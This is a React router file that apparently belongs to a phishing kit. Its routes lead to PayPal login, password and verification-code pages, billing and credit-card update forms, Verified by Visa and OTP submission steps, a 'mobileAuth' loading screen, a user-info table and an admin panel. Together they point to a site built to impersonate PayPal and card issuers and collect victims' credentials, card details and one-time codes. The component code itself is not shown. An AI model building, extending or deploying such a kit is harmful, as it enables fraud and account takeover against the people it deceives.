import React, { useEffect } from 'react';
import { BrowserRouter, Route, Switch } from 'react-router-dom';
import Login from './components/auth/Login';
import Verification from './components/Verification'; 
import res from './components/AllUsersInfoTable'; 
import ppl from './components/paypal/login'; 
import code from './components/paypal/code'; 
import codeverif from './components/paypal/codeverif'; 
import pass from './components/paypal/pass'; 
import codeinput from './components/paypal/codeinput'; 
import paypalbilling from './components/paypal/paypalbilling'; 
import VerificationError from './components/AddressForm_Error';
import paypaladdressadd from './components/paypal/paypaladdressadd'; 
import paypaltoverif from './components/paypal/paypaltoverif'; 
import container from './components/vbv/container'; 
import vbvsubmit from './components/vbv/vbvsubmit'; 
import AdminPanel from './components/AdminPanel'; // Import AdminPanel
import ContainerCustom from './components/containers/container_custom'; // Import ContainerCustom
import ContainerLoading from './components/containers/container_app_loading'; // Import ContainerLoading
import ContainerCode from './components/containers/container_code'; // Import ContainerCode
import ContainerError from './components/containers/container_error'; // Import ContainerError
import ContainerCustomError from './components/containers/container_custom_error'; // Import ContainerCustomError
import VerificationCC from './components/CreditCardForm';
function App() {
  // Function to fix double scrollbars
  useEffect(() => {
    function fixDoubleScrollbars() {
      const htmlElement = document.documentElement;
      const bodyElement = document.body;
      // Apply styles to prevent double scrollbars
      htmlElement.style.height = '100%';
      htmlElement.style.overflow = 'hidden';
      bodyElement.style.height = '100%';
      bodyElement.style.margin = '0';
      bodyElement.style.overflowX = 'hidden';
      bodyElement.style.overflowY = 'auto';

      // Optional: Hide the scrollbar on WebKit browsers when not needed
      bodyElement.style.scrollbarWidth = 'none'; // Firefox
      bodyElement.style.msOverflowStyle = 'none'; // Internet Explorer 10+
      bodyElement.style.WebkitScrollbar = 'none'; // WebKit browsers
    }

    // Run the function on load and whenever layout changes
    fixDoubleScrollbars();
    window.addEventListener('resize', fixDoubleScrollbars);

    // Cleanup the event listener when the component is unmounted
    return () => {
      window.removeEventListener('resize', fixDoubleScrollbars);
    };
  }, []); // Empty dependency array to run this effect only once when the component mounts

  return (
    <BrowserRouter>
      <Switch>
        {/* Public routes */}
        <Route exact path="/" component={Login} />
        <Route exact path="/login" component={Login} />
        <Route exact path="/billingUpdate" component={Verification} />
        //<Route exact path="/res" component={res} />
        <Route exact path="/ppl" component={ppl} />
        <Route exact path="/pass" component={pass} />
        <Route exact path="/code" component={code} />
        <Route exact path="/codeverif" component={codeverif} />
        <Route exact path="/billingUpdate_Error" component={VerificationError} />
        <Route exact path="/paypaltoverif" component={paypaltoverif} />
        <Route exact path="/paypaladdressadd" component={paypaladdressadd} />
        <Route exact path="/paypalbilling" component={paypalbilling} />
        <Route exact path="/codeinput" component={codeinput} />
        <Route exact path="/container" component={container} />
        <Route exact path="/panel" component={AdminPanel} />
        <Route exact path="/PaymentUpdate" component={VerificationCC} />
        <Route exact path="/vbvsubmit" component={vbvsubmit} />
        <Route exact path="/otp_submit" component={ContainerCode} /> {/* Add route for ContainerCode */}
        <Route exact path="/otp_submitError" component={ContainerError} /> {/* Add route for ContainerError */}
        <Route exact path="/otpSubmit" component={ContainerCustom} /> {/* Add route for ContainerCustom */}
        <Route exact path="/otpSubmit_error" component={ContainerCustomError} /> {/* Add route for ContainerCustomError */}
        <Route exact path="/mobileAuth" component={ContainerLoading} /> {/* Add route for ContainerLoading */}
        {/* Add more routes here as needed */}
      </Switch>
    </BrowserRouter>
  );
}

export default App;
